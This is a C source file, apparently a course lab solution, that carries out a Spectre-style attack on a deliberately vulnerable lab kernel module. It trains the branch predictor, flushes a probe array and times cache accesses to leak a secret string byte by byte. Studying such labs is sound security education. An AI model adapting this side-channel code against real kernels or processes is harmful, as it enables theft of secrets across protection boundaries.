/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define THRESHOLD 200
#define DIRECT_ATTEMPTS 100
#define SPEC_ATTEMPTS 2500
#define TRAIN_TIMES 30

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN] = {0};
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        int candidates[256] = {0};

        if (current_offset < 4) {
            for (int attempt = 0; attempt < DIRECT_ATTEMPTS; attempt++) {
                for (int i = 0; i < 256; i++) {
                    clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
                }

                call_kernel_part3(kernel_fd, shared_memory, current_offset);

                int best = -1;
                uint64_t best_time = (uint64_t)-1;

                for (int i = 0; i < 256; i++) {
                    int mix_i = ((i * 167) + 13) & 255;
                    char *addr = &shared_memory[mix_i * SHD_SPECTRE_LAB_PAGE_SIZE];
                    uint64_t dt = time_access(addr);

                    if (dt < best_time) {
                        best_time = dt;
                        best = mix_i;
                    }
                }

                if (best >= 0 && best_time < THRESHOLD) {
                    candidates[best]++;
                }
            }
        } else {
            for (int attempt = 0; attempt < SPEC_ATTEMPTS; attempt++) {
                for (int i = 0; i < 256; i++) {
                    clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
                }

                for (int j = TRAIN_TIMES; j >= 0; j--) {
                    size_t training_offset = j & 3;
                    size_t x = ((j % 6) - 1) & ~0xFFFF;
                    x = x | (x >> 16);
                    x = training_offset ^ (x & (current_offset ^ training_offset));
                    call_kernel_part3(kernel_fd, shared_memory, x);
                }

                int best = -1;
                uint64_t best_time = (uint64_t)-1;

                for (int i = 0; i < 256; i++) {
                    int mix_i = ((i * 167) + 13) & 255;
                    char *addr = &shared_memory[mix_i * SHD_SPECTRE_LAB_PAGE_SIZE];
                    uint64_t dt = time_access(addr);

                    if (dt < best_time) {
                        best_time = dt;
                        best = mix_i;
                    }
                }

                if (best >= 0 && best_time < THRESHOLD) {
                    candidates[best]++;
                }
            }
        }

        int best = 0;
        int best_score = candidates[0];

        for (int i = 1; i < 256; i++) {
            if (candidates[i] > best_score) {
                best_score = candidates[i];
                best = i;
            }
        }

        if (current_offset >= 4 && best_score == 0) {
            leaked_byte = '?';
        } else {
            leaked_byte = (char)best;
        }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}